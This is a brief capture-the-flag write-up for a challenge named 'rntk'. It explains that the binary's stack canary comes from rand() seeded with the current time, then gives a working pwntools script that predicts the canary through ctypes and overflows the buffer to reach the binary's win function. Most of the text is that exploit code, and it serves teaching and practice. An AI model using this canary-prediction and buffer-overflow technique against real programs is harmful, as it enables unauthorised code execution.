# rntk

The challenge is a simple ret2win one with the only complication being that the binary uses a custom generated canary. It uses the `rand` function in libc to generate it and uses the current time as seed for it's value. We use `ctypes` to call `rand` to get the canary value and then we can do a ret2win.

```python
from pwn import *
from time import time
from ctypes import CDLL
context.arch = "amd64"
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

io = process("./chal")
# io = remote("amt.rs", 31175)
elf = ELF("./chal")

current_time = int(time())
libc.srand(current_time)
canary = libc.rand()

io.sendlineafter(b'Exit', b'2')

payload = b"A"*44
payload += p32(canary)
payload += b"A"*8
payload += p64(elf.sym["win"])

io.sendlineafter(b'guess: ', payload)

io.interactive()
```